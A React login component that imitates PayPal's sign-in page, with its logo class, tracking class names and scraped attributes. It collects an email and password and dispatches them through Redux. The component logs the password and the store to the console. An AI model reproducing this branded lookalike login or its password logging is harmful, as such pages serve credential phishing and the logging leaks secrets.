import React, { Component } from 'react'
import './login.css'
import { Link } from 'react-router-dom'
import { startLoginUser } from '../redux/actions/userAction'
import { connect } from 'react-redux'
import { ACCOUNT } from '../constants';
import Button from '@material-ui/core/Button';
import CircularProgress from '@material-ui/core/CircularProgress';
import _ from 'lodash'
import {isEmail} from '../SignUp/emailReg'
class Login extends Component {
    constructor(props) {
        super(props);
        this.state = {
            message: null,
            email: '',
            password: '',
            loading: false,

            error: {

                email: null,
                password: null,
            }
        }
 
        this.formValidation = this.formValidation.bind(this)
    }
    componentWillReceiveProps(nextProps) {
        this.setState({ loading: false })
        if (nextProps.user.email) {
            this
                .props
                .history
                .push(ACCOUNT);
        }

    }
    formValidation(fieldsToValidate = [], callback = () => {}){


		const allFields = {



			email: {
				message: "Email is not correct",
				doValidate: () => {

					const value = _.get(this.state, 'email', '');

					if(value.length >0 && isEmail(value)){

						return true;
					}
					return false;
				}
			},

			password: {
				message: "Password shoud has more than 3 characters.",
				doValidate: () => {


					const value = _.get(this.state, 'password', '');


					if(value && value.length > 3){

							return true;
					}

					return false;

				}
			},

        }

		let errors = this.state.error;

		_.each(fieldsToValidate, (field) => {

				const fieldValidate = _.get(allFields, field);
				if(fieldValidate){

					errors[field] = null;

					const isFieldValid = fieldValidate.doValidate();

					if(isFieldValid === false){
						errors[field] = _.get(fieldValidate, 'message');
					}
				}

		});



		this.setState({
			error: errors,
		}, () => {
		
			console.log("After processed validation the form errors", errors);

			let isValid = true;

			_.each(errors, (err) => {

				if(err){
					isValid = false;

				}
			});

			callback(isValid);

		})

		

}
    onChange = e => {
        e.preventDefault();
        let name = e.target.name;
        let value = e.target.value;
        this.setState({ [name]: value })
        console.log({ [name]: value });

    }
    onSubmit = e => {
        e.preventDefault();
        this.setState({ loading: false });
        const { email, password } = this.state;
        let data = {
            email,
            password
        }
        // console.log(data)

        this.props.changeState(data)


    }
    onClickHandler = (e) => {
        e.preventDefault();
        this.setState({ loading: true });
        const { email, password } = this.state;
        let data = {
            email,
            password
        }
        this
            .props
            .changeState(data);

    }

    render() {
        const { email, password, loading } = this.state;
        const isnotValid = email === '' || password === '' || loading;
        return (
            <div className="body">
                {/* <img src='http://yesofcorsa.com/wp-content/uploads/2017/01/4K-Lights-Wallpaper.jpg' className="imgLogin" alt=""/> */}
                <div className='loginOuter row'>
                    <div className="loginForm container">
                        <header className="col-lg-12 col-md-12 col-sm-12 col-xs-12"><p class="paypal-logo paypal-logo-long"></p></header>
                        <div className="formOuter">
                            <form action="/nextSignUp" method="POST">
                                <input type="text" require placeholder="Email or mobile Number" name="email" value={this.state.email} onChange={this.onChange} className='email f1 col-lg-12 col-md-12 col-sm-12 col-xs-12' required />
                                <input type="password" require placeholder="Password" name="password" value={this.state.password} onChange={this.onChange} className='email f1 col-lg-12 col-md-12 col-sm-12 col-xs-12' required />
                                <div class="actions">

                                    <Button
                                        onClick={this.onClickHandler}
                                        disabled={isnotValid}
                                        variant="contained"
                                        size="medium"
                                        color="primary"
                                        className="button f1 actionContinue scTrack:unifiedlogin-login-click-next"
                                    
                                    >
                                        {loading
                                            ? <CircularProgress size={20} />
                                            : <span>
                                                Login



                                            </span>
                                        }
                                    </Button>

                                    {/* <button className="button actionContinue scTrack:unifiedlogin-login-click-next" type="submit" id="btnNext" name="btnNext" value="Next" pa-marked="1">Log In</button> */}
                                </div>
                                <Link to='/forget' className="troubleLogin">Having trouble loggin In?</Link>
                                <div className="loginSignUpSeparator"><span className="textInSeparator">or</span></div>
                                <Link to="/forget/signup" className="button secondary scTrack:unifiedlogin-click-signup-button" id="createAccount" pa-marked="1">Sign Up</Link>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        )
    }
}

const mapStateToProps = (store) => {
    console.log('store', store);

    return {
        user: store.user.user
    }
}
const mapDispatchToProps = (dispatch) => {
    return ({
        changeState: (userData) => {
            dispatch(startLoginUser(userData))
        }
    })
}

export default connect(mapStateToProps, mapDispatchToProps)(Login)